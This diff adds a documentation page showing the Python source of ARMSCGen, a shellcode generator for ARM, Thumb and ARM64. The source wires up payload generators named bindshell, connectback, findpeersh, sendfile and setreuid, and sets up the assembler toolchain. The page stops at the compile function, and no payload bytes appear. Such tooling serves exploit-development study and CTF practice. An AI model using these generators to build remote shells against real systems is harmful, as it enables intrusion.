@@ -1,0 +1,755 @@
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    
+    <title>ARMSCGen &mdash; ARMSCGen $0.0.12 documentation</title>
+    
+    <link rel="stylesheet" href="../_static/default.css" type="text/css" />
+    <link rel="stylesheet" href="../_static/pygments.css" type="text/css" />
+    
+    <script type="text/javascript">
+      var DOCUMENTATION_OPTIONS = {
+        URL_ROOT:    '../',
+        VERSION:     '$0.0.12',
+        COLLAPSE_INDEX: false,
+        FILE_SUFFIX: '.html',
+        HAS_SOURCE:  true
+      };
+    </script>
+    <script type="text/javascript" src="../_static/jquery.js"></script>
+    <script type="text/javascript" src="../_static/underscore.js"></script>
+    <script type="text/javascript" src="../_static/doctools.js"></script>
+    <link rel="top" title="ARMSCGen $0.0.12 documentation" href="../index.html" />
+    <link rel="up" title="Module code" href="index.html" /> 
+  </head>
+  <body>
+    <div class="related">
+      <h3>Navigation</h3>
+      <ul>
+        <li class="right" style="margin-right: 10px">
+          <a href="../genindex.html" title="General Index"
+             accesskey="I">index</a></li>
+        <li class="right" >
+          <a href="../py-modindex.html" title="Python Module Index"
+             >modules</a> |</li>
+        <li><a href="../index.html">ARMSCGen $0.0.12 documentation</a> &raquo;</li>
+          <li><a href="index.html" accesskey="U">Module code</a> &raquo;</li> 
+      </ul>
+    </div>  
+
+    <div class="document">
+      <div class="documentwrapper">
+        <div class="bodywrapper">
+          <div class="body">
+            
+  <h1>Source code for ARMSCGen</h1><div class="highlight"><pre>
+<span class="c">#!python</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">tempfile</span>
+<span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="n">ntohs</span>
+<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">unpack</span><span class="p">,</span> <span class="n">pack</span>
+
+<span class="n">__VERSION__</span> <span class="o">=</span> <span class="s">&#39;$0.0.12&#39;</span>
+<span class="n">__AUTHOR__</span>  <span class="o">=</span> <span class="s">&#39;alex.park&#39;</span>
+
+<span class="c">##########################################################</span>
+<span class="c">## Thumb Mode </span>
+<span class="c">##########################################################</span>
+<span class="kn">from</span> <span class="nn">shellcodes.thumb</span> <span class="kn">import</span> <span class="n">chmod</span>       <span class="k">as</span> <span class="n">th_chmod</span>
+<span class="kn">from</span> <span class="nn">shellcodes.thumb</span> <span class="kn">import</span> <span class="n">dup</span>         <span class="k">as</span> <span class="n">th_dup</span>
+<span class="kn">from</span> <span class="nn">shellcodes.thumb</span> <span class="kn">import</span> <span class="n">sh</span>          <span class="k">as</span> <span class="n">th_sh</span>
+<span class="kn">from</span> <span class="nn">shellcodes.thumb</span> <span class="kn">import</span> <span class="n">dupsh</span>       <span class="k">as</span> <span class="n">th_dupsh</span>
+<span class="kn">from</span> <span class="nn">shellcodes.thumb</span> <span class="kn">import</span> <span class="n">bindshell</span>   <span class="k">as</span> <span class="n">th_bindshell</span>
+<span class="kn">from</span> <span class="nn">shellcodes.thumb</span> <span class="kn">import</span> <span class="n">listen</span>      <span class="k">as</span> <span class="n">th_listen</span>
+<span class="kn">from</span> <span class="nn">shellcodes.thumb</span> <span class="kn">import</span> <span class="n">acceptloop</span>  <span class="k">as</span> <span class="n">th_acceptloop</span>
+<span class="kn">from</span> <span class="nn">shellcodes.thumb</span> <span class="kn">import</span> <span class="n">connect</span>     <span class="k">as</span> <span class="n">th_connect</span>
+<span class="kn">from</span> <span class="nn">shellcodes.thumb</span> <span class="kn">import</span> <span class="n">connectback</span> <span class="k">as</span> <span class="n">th_connectback</span>
+<span class="kn">from</span> <span class="nn">shellcodes.thumb</span> <span class="kn">import</span> <span class="n">open_file</span>   <span class="k">as</span> <span class="n">th_open_file</span>
+<span class="kn">from</span> <span class="nn">shellcodes.thumb</span> <span class="kn">import</span> <span class="n">sendfile</span>    <span class="k">as</span> <span class="n">th_sendfile</span>
+<span class="kn">from</span> <span class="nn">shellcodes.thumb</span> <span class="kn">import</span> <span class="n">cat</span>         <span class="k">as</span> <span class="n">th_cat</span>
+<span class="kn">from</span> <span class="nn">shellcodes.thumb</span> <span class="kn">import</span> <span class="nb">exit</span>        <span class="k">as</span> <span class="n">th_exit</span>
+<span class="kn">from</span> <span class="nn">shellcodes.thumb</span> <span class="kn">import</span> <span class="n">findpeer</span>    <span class="k">as</span> <span class="n">th_findpeer</span>
+<span class="kn">from</span> <span class="nn">shellcodes.thumb</span> <span class="kn">import</span> <span class="n">findpeersh</span>  <span class="k">as</span> <span class="n">th_findpeersh</span>
+<span class="kn">from</span> <span class="nn">shellcodes.thumb</span> <span class="kn">import</span> <span class="n">getdents</span>    <span class="k">as</span> <span class="n">th_getdents</span>
+<span class="kn">from</span> <span class="nn">shellcodes.thumb</span> <span class="kn">import</span> <span class="n">ls</span>          <span class="k">as</span> <span class="n">th_ls</span>
+<span class="kn">from</span> <span class="nn">shellcodes.thumb</span> <span class="kn">import</span> <span class="n">setreuid</span>    <span class="k">as</span> <span class="n">th_setreuid</span>
+<span class="kn">from</span> <span class="nn">shellcodes.thumb</span> <span class="kn">import</span> <span class="n">setregid</span>    <span class="k">as</span> <span class="n">th_setregid</span>
+<span class="kn">from</span> <span class="nn">shellcodes.thumb</span> <span class="kn">import</span> <span class="n">overwrite</span>   <span class="k">as</span> <span class="n">th_overwrite</span>
+<span class="kn">from</span> <span class="nn">shellcodes.thumb</span> <span class="kn">import</span> <span class="n">appendwrite</span> <span class="k">as</span> <span class="n">th_appendwrite</span>
+<span class="kn">from</span> <span class="nn">shellcodes.thumb</span> <span class="kn">import</span> <span class="n">read_from_stack</span> <span class="k">as</span> <span class="n">th_read_from_stack</span>
+<span class="kn">from</span> <span class="nn">shellcodes.thumb</span> <span class="kn">import</span> <span class="n">write_to_stack</span>  <span class="k">as</span> <span class="n">th_write_to_stack</span>
+<span class="kn">from</span> <span class="nn">shellcodes.thumb</span> <span class="kn">import</span> <span class="n">infinityloop</span>    <span class="k">as</span> <span class="n">th_infinityloop</span>
+
+<span class="c">##########################################################</span>
+<span class="c">## ARM Mode</span>
+<span class="c">##########################################################</span>
+<span class="kn">from</span> <span class="nn">shellcodes.arm</span> <span class="kn">import</span> <span class="n">dup</span>   <span class="k">as</span> <span class="n">arm_dup</span>
+<span class="kn">from</span> <span class="nn">shellcodes.arm</span> <span class="kn">import</span> <span class="n">sh</span>    <span class="k">as</span> <span class="n">arm_sh</span>
+<span class="kn">from</span> <span class="nn">shellcodes.arm</span> <span class="kn">import</span> <span class="n">dupsh</span> <span class="k">as</span> <span class="n">arm_dupsh</span>
+
+<span class="c">##########################################################</span>
+<span class="c">## ARM64 Mode</span>
+<span class="c">##########################################################</span>
+<span class="kn">from</span> <span class="nn">shellcodes.arm64</span> <span class="kn">import</span> <span class="n">sh</span>   <span class="k">as</span> <span class="n">arm64_sh</span>
+<span class="kn">from</span> <span class="nn">shellcodes.arm64</span> <span class="kn">import</span> <span class="n">dup</span>  <span class="k">as</span> <span class="n">arm64_dup</span>
+<span class="kn">from</span> <span class="nn">shellcodes.arm64</span> <span class="kn">import</span> <span class="n">cat</span>  <span class="k">as</span> <span class="n">arm64_cat</span>
+<span class="kn">from</span> <span class="nn">shellcodes.arm64</span> <span class="kn">import</span> <span class="nb">exit</span> <span class="k">as</span> <span class="n">arm64_exit</span>
+<span class="kn">from</span> <span class="nn">shellcodes.arm64</span> <span class="kn">import</span> <span class="n">dupsh</span> <span class="k">as</span> <span class="n">arm64_dupsh</span>
+<span class="kn">from</span> <span class="nn">shellcodes.arm64</span> <span class="kn">import</span> <span class="n">setreuid</span> <span class="k">as</span> <span class="n">arm64_setreuid</span>
+<span class="kn">from</span> <span class="nn">shellcodes.arm64</span> <span class="kn">import</span> <span class="n">setregid</span> <span class="k">as</span> <span class="n">arm64_setregid</span>
+<span class="kn">from</span> <span class="nn">shellcodes.arm64</span> <span class="kn">import</span> <span class="n">sendfile</span> <span class="k">as</span> <span class="n">arm64_sendfile</span>
+<span class="kn">from</span> <span class="nn">shellcodes.arm64</span> <span class="kn">import</span> <span class="n">open_file</span> <span class="k">as</span> <span class="n">arm64_open_file</span>
+<span class="kn">from</span> <span class="nn">shellcodes.arm64</span> <span class="kn">import</span> <span class="n">connect</span>   <span class="k">as</span> <span class="n">arm64_connect</span>
+<span class="kn">from</span> <span class="nn">shellcodes.arm64</span> <span class="kn">import</span> <span class="n">connectback</span> <span class="k">as</span> <span class="n">arm64_connectback</span>
+<span class="kn">from</span> <span class="nn">shellcodes.arm64</span> <span class="kn">import</span> <span class="n">listen</span> <span class="k">as</span> <span class="n">arm64_listen</span>
+<span class="kn">from</span> <span class="nn">shellcodes.arm64</span> <span class="kn">import</span> <span class="n">acceptloop</span> <span class="k">as</span> <span class="n">arm64_acceptloop</span>
+<span class="kn">from</span> <span class="nn">shellcodes.arm64</span> <span class="kn">import</span> <span class="n">bindshell</span> <span class="k">as</span> <span class="n">arm64_bindshell</span>
+<span class="kn">from</span> <span class="nn">shellcodes.arm64</span> <span class="kn">import</span> <span class="n">infinityloop</span> <span class="k">as</span> <span class="n">arm64_infinityloop</span>
+<span class="kn">from</span> <span class="nn">shellcodes.arm64</span> <span class="kn">import</span> <span class="n">read_from_stack</span> <span class="k">as</span> <span class="n">arm64_read_from_stack</span>
+<span class="kn">from</span> <span class="nn">shellcodes.arm64</span> <span class="kn">import</span> <span class="n">getdents</span>    <span class="k">as</span> <span class="n">arm64_getdents</span>
+<span class="kn">from</span> <span class="nn">shellcodes.arm64</span> <span class="kn">import</span> <span class="n">ls</span>          <span class="k">as</span> <span class="n">arm64_ls</span>
+<span class="kn">from</span> <span class="nn">shellcodes.arm64</span> <span class="kn">import</span> <span class="n">appendwrite</span> <span class="k">as</span> <span class="n">arm64_appendwrite</span>
+<span class="kn">from</span> <span class="nn">shellcodes.arm64</span> <span class="kn">import</span> <span class="n">write_to_stack</span>  <span class="k">as</span> <span class="n">arm64_write_to_stack</span>
+<span class="kn">from</span> <span class="nn">shellcodes.arm64</span> <span class="kn">import</span> <span class="n">overwrite</span> <span class="k">as</span> <span class="n">arm64_overwrite</span>
+<span class="kn">from</span> <span class="nn">shellcodes.arm64</span> <span class="kn">import</span> <span class="n">fsync</span> <span class="k">as</span> <span class="n">arm64_fsync</span>
+<span class="kn">from</span> <span class="nn">shellcodes.arm64</span> <span class="kn">import</span> <span class="n">lseek</span> <span class="k">as</span> <span class="n">arm64_lseek</span>
+<span class="kn">from</span> <span class="nn">shellcodes.arm64</span> <span class="kn">import</span> <span class="n">findpeer</span> <span class="k">as</span> <span class="n">arm64_findpeer</span>
+<span class="kn">from</span> <span class="nn">shellcodes.arm64</span> <span class="kn">import</span> <span class="n">findpeersh</span> <span class="k">as</span> <span class="n">arm64_findpeersh</span>
+
+<div class="viewcode-block" id="thumbSCGen"><a class="viewcode-back" href="../ARMSCGen.html#ARMSCGen.thumbSCGen">[docs]</a><span class="k">class</span> <span class="nc">thumbSCGen</span><span class="p">:</span>
+    <span class="sd">&quot;&quot;&quot;Thumb Mode Shellcode Generator Class</span>
+
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">chmod</span>       <span class="o">=</span> <span class="n">th_chmod</span><span class="o">.</span><span class="n">generate</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">dup</span>         <span class="o">=</span> <span class="n">th_dup</span><span class="o">.</span><span class="n">generate</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">sh</span>          <span class="o">=</span> <span class="n">th_sh</span><span class="o">.</span><span class="n">generate</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">dupsh</span>       <span class="o">=</span> <span class="n">th_dupsh</span><span class="o">.</span><span class="n">generate</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">bindshell</span>   <span class="o">=</span> <span class="n">th_bindshell</span><span class="o">.</span><span class="n">generate</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">listen</span>      <span class="o">=</span> <span class="n">th_listen</span><span class="o">.</span><span class="n">generate</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">acceptloop</span>  <span class="o">=</span> <span class="n">th_acceptloop</span><span class="o">.</span><span class="n">generate</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">connect</span>     <span class="o">=</span> <span class="n">th_connect</span><span class="o">.</span><span class="n">generate</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">connectback</span> <span class="o">=</span> <span class="n">th_connectback</span><span class="o">.</span><span class="n">generate</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">open_file</span>   <span class="o">=</span> <span class="n">th_open_file</span><span class="o">.</span><span class="n">generate</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">sendfile</span>    <span class="o">=</span> <span class="n">th_sendfile</span><span class="o">.</span><span class="n">generate</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">cat</span>         <span class="o">=</span> <span class="n">th_cat</span><span class="o">.</span><span class="n">generate</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">exit</span>        <span class="o">=</span> <span class="n">th_exit</span><span class="o">.</span><span class="n">generate</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">findpeer</span>    <span class="o">=</span> <span class="n">th_findpeer</span><span class="o">.</span><span class="n">generate</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">findpeersh</span>  <span class="o">=</span> <span class="n">th_findpeersh</span><span class="o">.</span><span class="n">generate</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">getdents</span>    <span class="o">=</span> <span class="n">th_getdents</span><span class="o">.</span><span class="n">generate</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">ls</span>          <span class="o">=</span> <span class="n">th_ls</span><span class="o">.</span><span class="n">generate</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">setreuid</span>    <span class="o">=</span> <span class="n">th_setreuid</span><span class="o">.</span><span class="n">generate</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">setregid</span>    <span class="o">=</span> <span class="n">th_setregid</span><span class="o">.</span><span class="n">generate</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">overwrite</span>   <span class="o">=</span> <span class="n">th_overwrite</span><span class="o">.</span><span class="n">generate</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">appendwrite</span> <span class="o">=</span> <span class="n">th_appendwrite</span><span class="o">.</span><span class="n">generate</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">read_from_stack</span> <span class="o">=</span> <span class="n">th_read_from_stack</span><span class="o">.</span><span class="n">generate</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">write_to_stack</span>  <span class="o">=</span> <span class="n">th_write_to_stack</span><span class="o">.</span><span class="n">generate</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">infinityloop</span>    <span class="o">=</span> <span class="n">th_infinityloop</span><span class="o">.</span><span class="n">generate</span>
+        <span class="n">prepareCompiler</span><span class="p">(</span><span class="s">&#39;THUMB&#39;</span><span class="p">)</span>
+        
+</div>
+<div class="viewcode-block" id="armSCGen"><a class="viewcode-back" href="../ARMSCGen.html#ARMSCGen.armSCGen">[docs]</a><span class="k">class</span> <span class="nc">armSCGen</span><span class="p">:</span>
+    <span class="sd">&quot;&quot;&quot;ARM Mode Shellcode Generator Class</span>
+
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">dup</span>        <span class="o">=</span> <span class="n">arm_dup</span><span class="o">.</span><span class="n">generate</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">sh</span>         <span class="o">=</span> <span class="n">arm_sh</span><span class="o">.</span><span class="n">generate</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">dupsh</span>      <span class="o">=</span> <span class="n">arm_dupsh</span><span class="o">.</span><span class="n">generate</span>
+        <span class="n">prepareCompiler</span><span class="p">(</span><span class="s">&#39;ARM&#39;</span><span class="p">)</span>
+</div>
+<div class="viewcode-block" id="arm64SCGen"><a class="viewcode-back" href="../ARMSCGen.html#ARMSCGen.arm64SCGen">[docs]</a><span class="k">class</span> <span class="nc">arm64SCGen</span><span class="p">:</span>
+    <span class="sd">&quot;&quot;&quot;ARM64 Mode Shellcode Generator Class</span>
+
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">sh</span>         <span class="o">=</span> <span class="n">arm64_sh</span><span class="o">.</span><span class="n">generate</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">dup</span>        <span class="o">=</span> <span class="n">arm64_dup</span><span class="o">.</span><span class="n">generate</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">cat</span>        <span class="o">=</span> <span class="n">arm64_cat</span><span class="o">.</span><span class="n">generate</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">exit</span>       <span class="o">=</span> <span class="n">arm64_exit</span><span class="o">.</span><span class="n">generate</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">dupsh</span>      <span class="o">=</span> <span class="n">arm64_dupsh</span><span class="o">.</span><span class="n">generate</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">setreuid</span>   <span class="o">=</span> <span class="n">arm64_setreuid</span><span class="o">.</span><span class="n">generate</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">setregid</span>   <span class="o">=</span> <span class="n">arm64_setregid</span><span class="o">.</span><span class="n">generate</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">sendfile</span>   <span class="o">=</span> <span class="n">arm64_sendfile</span><span class="o">.</span><span class="n">generate</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">open_file</span>  <span class="o">=</span> <span class="n">arm64_open_file</span><span class="o">.</span><span class="n">generate</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">connect</span>    <span class="o">=</span> <span class="n">arm64_connect</span><span class="o">.</span><span class="n">generate</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">connectback</span> <span class="o">=</span> <span class="n">arm64_connectback</span><span class="o">.</span><span class="n">generate</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">listen</span>      <span class="o">=</span> <span class="n">arm64_listen</span><span class="o">.</span><span class="n">generate</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">acceptloop</span>  <span class="o">=</span> <span class="n">arm64_acceptloop</span><span class="o">.</span><span class="n">generate</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">bindshell</span>   <span class="o">=</span> <span class="n">arm64_bindshell</span><span class="o">.</span><span class="n">generate</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">infinityloop</span> <span class="o">=</span> <span class="n">arm64_infinityloop</span><span class="o">.</span><span class="n">generate</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">read_from_stack</span> <span class="o">=</span> <span class="n">arm64_read_from_stack</span><span class="o">.</span><span class="n">generate</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">getdents</span>    <span class="o">=</span> <span class="n">arm64_getdents</span><span class="o">.</span><span class="n">generate</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">ls</span>          <span class="o">=</span> <span class="n">arm64_ls</span><span class="o">.</span><span class="n">generate</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">overwrite</span>   <span class="o">=</span> <span class="n">arm64_overwrite</span><span class="o">.</span><span class="n">generate</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">write_to_stack</span>  <span class="o">=</span> <span class="n">arm64_write_to_stack</span><span class="o">.</span><span class="n">generate</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">appendwrite</span> <span class="o">=</span> <span class="n">arm64_appendwrite</span><span class="o">.</span><span class="n">generate</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">fsync</span> <span class="o">=</span> <span class="n">arm64_fsync</span><span class="o">.</span><span class="n">generate</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">lseek</span> <span class="o">=</span> <span class="n">arm64_lseek</span><span class="o">.</span><span class="n">generate</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">findpeer</span> <span class="o">=</span> <span class="n">arm64_findpeer</span><span class="o">.</span><span class="n">generate</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">findpeersh</span> <span class="o">=</span> <span class="n">arm64_findpeersh</span><span class="o">.</span><span class="n">generate</span>
+        <span class="n">prepareCompiler</span><span class="p">(</span><span class="s">&#39;ARM64&#39;</span><span class="p">)</span>
+
+<span class="c"># Assembler </span></div>
+<span class="n">BIN_AS32</span> <span class="o">=</span> <span class="s">&#39;/usr/bin/arm-linux-gnueabi-as&#39;</span>
+<span class="n">BIN_AS64</span> <span class="o">=</span> <span class="s">&#39;/usr/bin/aarch64-linux-gnu-as&#39;</span>
+<span class="n">ALTER_BIN_AS</span> <span class="o">=</span> <span class="s">&#39;as&#39;</span>
+<span class="c"># Linker</span>
+<span class="n">BIN_LD32</span> <span class="o">=</span> <span class="s">&#39;/usr/bin/arm-linux-gnueabi-ld&#39;</span>
+<span class="n">BIN_LD64</span> <span class="o">=</span> <span class="s">&#39;/usr/bin/aarch64-linux-gnu-ld&#39;</span>
+<span class="n">ALTER_BIN_LD</span> <span class="o">=</span> <span class="s">&#39;ld&#39;</span>
+<span class="c"># Objcopy</span>
+<span class="n">BIN_OC32</span> <span class="o">=</span> <span class="s">&#39;/usr/bin/arm-linux-gnueabi-objcopy&#39;</span>
+<span class="n">BIN_OC64</span> <span class="o">=</span> <span class="s">&#39;/usr/bin/aarch64-linux-gnu-objcopy&#39;</span>
+<span class="n">ALTER_BIN_OC</span> <span class="o">=</span> <span class="s">&#39;objcopy&#39;</span>
+<span class="c"># Empty </span>
+<span class="n">BIN_AS</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
+<span class="n">BIN_LD</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
+<span class="n">BIN_OC</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
+
+<span class="c"># RAW Shellcode</span>
+<span class="n">RAW_SC</span> <span class="o">=</span> <span class="s">&#39;raw_sc&#39;</span>
+
+<span class="c"># capstone available</span>
+<span class="n">g_capstone</span> <span class="o">=</span> <span class="bp">False</span>
+<span class="k">try</span><span class="p">:</span>
+    <span class="kn">from</span> <span class="nn">capstone</span> <span class="kn">import</span> <span class="o">*</span>
+    <span class="kn">from</span> <span class="nn">capstone.arm</span> <span class="kn">import</span> <span class="o">*</span>
+    <span class="n">g_capstone</span> <span class="o">=</span> <span class="bp">True</span>
+<span class="k">except</span> <span class="ne">ImportError</span><span class="p">:</span>
+    <span class="c">#SYSERR(&quot;There is no capstone library for disassembling&quot;)</span>
+    <span class="n">g_capstone</span> <span class="o">=</span> <span class="bp">False</span>
+<span class="k">except</span><span class="p">:</span>
+    <span class="n">SYSERR</span><span class="p">(</span><span class="s">&quot;Exception: Unknown in disasm(...)&quot;</span><span class="p">)</span>
+
+<div class="viewcode-block" id="SYSERR"><a class="viewcode-back" href="../ARMSCGen.html#ARMSCGen.SYSERR">[docs]</a><span class="k">def</span> <span class="nf">SYSERR</span><span class="p">(</span><span class="n">m</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot;SYSERR(m) -&gt; None</span>
+
+<span class="sd">    Print syserr(2) screen to debug</span>
+
+<span class="sd">    Args:</span>
+<span class="sd">        m(fmt): message will be printed on syserr screen</span>
+
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="k">print</span> <span class="o">&gt;&gt;</span> <span class="n">sys</span><span class="o">.</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;</span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">m</span><span class="p">)</span>
+</div>
+<div class="viewcode-block" id="cleanup"><a class="viewcode-back" href="../ARMSCGen.html#ARMSCGen.cleanup">[docs]</a><span class="k">def</span> <span class="nf">cleanup</span><span class="p">(</span><span class="n">fn</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot;clean up compiled files</span>
+
+<span class="sd">    Args:</span>
+<span class="sd">        fn(list): files in list will be deleted</span>
+
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="k">for</span> <span class="n">f</span> <span class="ow">in</span> <span class="n">fn</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">f</span><span class="p">)</span> <span class="o">==</span> <span class="bp">True</span><span class="p">:</span>
+            <span class="k">try</span><span class="p">:</span>
+                <span class="n">os</span><span class="o">.</span><span class="n">unlink</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
+            <span class="k">except</span><span class="p">:</span>
+                <span class="k">pass</span>
+</div>
+<div class="viewcode-block" id="prepareCompiler"><a class="viewcode-back" href="../ARMSCGen.html#ARMSCGen.prepareCompiler">[docs]</a><span class="k">def</span> <span class="nf">prepareCompiler</span><span class="p">(</span><span class="n">mode</span><span class="o">=</span><span class="s">&#39;THUMB&#39;</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot;prepares some PATH to compile safely</span>
+
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="k">global</span> <span class="n">BIN_AS</span>
+    <span class="k">global</span> <span class="n">BIN_LD</span>
+    <span class="k">global</span> <span class="n">BIN_OC</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">mode</span> <span class="o">==</span> <span class="s">&#39;THUMB&#39;</span><span class="p">)</span> <span class="ow">or</span> <span class="p">(</span><span class="n">mode</span> <span class="o">==</span> <span class="s">&#39;ARM&#39;</span><span class="p">):</span>
+        <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">BIN_AS32</span><span class="p">)</span> <span class="o">==</span> <span class="bp">False</span><span class="p">:</span>
+            <span class="n">BIN_AS</span> <span class="o">=</span> <span class="n">ALTER_BIN_AS</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">BIN_AS</span> <span class="o">=</span> <span class="n">BIN_AS32</span>
+
+        <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">BIN_LD32</span><span class="p">)</span> <span class="o">==</span> <span class="bp">False</span><span class="p">:</span>
+            <span class="n">BIN_LD</span> <span class="o">=</span> <span class="n">ALTER_BIN_LD</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">BIN_LD</span> <span class="o">=</span> <span class="n">BIN_LD32</span>
+
+        <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">BIN_OC32</span><span class="p">)</span> <span class="o">==</span> <span class="bp">False</span><span class="p">:</span>
+            <span class="n">BIN_OC</span> <span class="o">=</span> <span class="n">ALTER_BIN_OC</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">BIN_OC</span> <span class="o">=</span> <span class="n">BIN_OC32</span>
+    <span class="k">elif</span> <span class="n">mode</span> <span class="o">==</span> <span class="s">&#39;ARM64&#39;</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">BIN_AS64</span><span class="p">)</span> <span class="o">==</span> <span class="bp">False</span><span class="p">:</span>
+            <span class="n">BIN_AS</span> <span class="o">=</span> <span class="n">ALTER_BIN_AS</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">BIN_AS</span> <span class="o">=</span> <span class="n">BIN_AS64</span>
+
+        <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">BIN_LD64</span><span class="p">)</span> <span class="o">==</span> <span class="bp">False</span><span class="p">:</span>
+            <span class="n">BIN_LD</span> <span class="o">=</span> <span class="n">ALTER_BIN_LD</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">BIN_LD</span> <span class="o">=</span> <span class="n">BIN_LD64</span>
+
+        <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">BIN_OC64</span><span class="p">)</span> <span class="o">==</span> <span class="bp">False</span><span class="p">:</span>
+            <span class="n">BIN_OC</span> <span class="o">=</span> <span class="n">ALTER_BIN_OC</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">BIN_OC</span> <span class="o">=</span> <span class="n">BIN_OC64</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">SYSERR</span><span class="p">(</span><span class="s">&quot;Not Implemented yet&quot;</span><span class="p">)</span>
+</div>
+<div class="viewcode-block" id="CompileSC"><a class="viewcode-back" href="../ARMSCGen.html#ARMSCGen.CompileSC">[docs]</a><span class="k">def</span> <span class="nf">CompileSC</span><span class="p">(</span><span class="n">source</span><span class="p">,</span> <span class="n">isThumb</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">isNeedHead</span><span class="o">=</span><span class="bp">True</span><span class="p">):</span>
